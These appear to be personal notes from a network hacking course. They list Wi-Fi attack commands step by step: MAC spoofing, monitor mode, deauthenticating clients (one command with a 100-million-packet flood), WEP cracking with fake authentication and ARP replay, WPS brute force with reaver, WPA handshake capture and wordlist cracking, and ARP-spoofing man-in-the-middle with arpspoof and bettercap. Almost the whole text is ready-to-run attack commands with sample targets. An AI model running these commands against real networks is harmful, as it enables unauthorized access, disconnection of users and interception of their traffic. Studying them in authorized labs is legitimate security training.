### Section4 - 11: Network Hacking
How to change a MAC Address
running the command: 

**ifconfig**

ether will be the MAC Address of the interface

to change the MAC Address you first have to disable it with the following command:

**ifconfig wlan0 (name of interface) down**

Command to change the MAC Address (make sure to start with 00)

**ifconfig wlan0 hw ether 00:11:22:33:44:55**

To enable the the interface again

**ifconfig wlan0 up**

iwconfig is a command to find out which mode the WiFi Adapter is using
need to disable the WiFi adapter before changing modes

Kill network manager for better results

**ifconfig wlan0 down**

**airmon-ng check kill**

Enabling Monitor Mode

**airmon-ng start wlano**

**iwconfig wlan0 mode monitor**

Enable interface once again

#### Most Common WiFi Bands
- a = uses 5Ghz frequency only.
- b,g = both use 2.4Ghz frequency only.
- n = uses 5 and 2.4Ghz.
- ac = uses frequency lower than 6 Ghz

**airodump-ng --band abg mon0** : looks for both 5Ghz and 2.4Ghz frequencys

#### Command to capture packets from a SSID

**sudo airodump-ng --bssid 4C:ED:FB:81:85:08 --channel 9 --write test wlan0mon**

#### Command to remove a device off a WIFI Network

**sudo aireplay-ng --deauth 100000000 -a 4C:ED:FB:81:85:08 -c 8C:FE:57:54:7F:A4 wlan0mon**

#### Instructions to Capture WEP Passwords 

**Run the same command we ran to capture packets from SSID**

#### Run aircrack-ng against the capture file created in another terminal windows

**aircrack-ng 'filename.cap'** 

The key will look like a MAC address. Remove the colons to get the password

If the network is not busy, different commands must be run

**aireplay-ng --fakeauth 0 -a "BSSID" -h "MAC Address of Wireless Card first 12 digits without dashes" wlan0mon**

To send more packets use the following command:

****aireplay-ng --arpreplay -b "BSSID" -h "MAC Address of Wireless Card first 12 digits without dashes" wlan0mon**

The command **wash** will display all the networks with WPS enabled

**wash --interface wlan0mon**

**aireplay-ng --fakeauth 30 -a "BSSID" -h "MAC Address of Wireless Card first 12 digits without dashes" wlan0mon**

Don't run above command till reaver is run

**reaver --bssid "MAC address of router" --channel 9 --interface wlan0mon -vvv --no-associate**

#### To Capture WPA Packets and Handshake

1st run **airodump-ng wlan0mon**

2nd run **sudo airodump-ng --bssid 4C:ED:FB:81:85:08 --channel 9 --write wpa_handshake  wlan0mon**

3rd run command while above is running (run with 4 packets for short disconnection)
**sudo aireplay-ng --deauth 4 -a 4C:ED:FB:81:85:08 -c 8C:FE:57:54:7F:A4 wlan0mon**

#### Creating a Wordlist with crunch

example
**sudo crunch 6 8 abc12 -o test.txt**

#### Crack the WPA with Handshake and Worklist files

**sudo aircrack-ng 'filename.cap' -w 'wordlistfile.txt'**

### Section 12: Network Hacking - Post Connection Attacks - MITM Attacks

#### ARP Spoofing

           (interface name) (target IP) (target Gateway)
**sudo arpspoof -i eth0 -t 192.168.1.139 192.168.1.1**
**on a split screen also run**
           (interface name) (target Gateway) (target IP)
**sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.139**

Then run the following command for port forwarding
**sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'** 

#### Can use Bettercap to do the same thing

**bettercap -iface eth0**

**'net.probe on' to get IP Addresses of devices on the Network**

**'net.show' to get a nice list of devices on the Network**

**set arp.spoof.fullduplex true**

**set arp.spoof.targets 192.168.1.139**

**arp.spoof on**

**net.spoof on** To get data from other computers

**bettercap -iface eth0 -caplet spoof.cap** This will run the commands from a file 

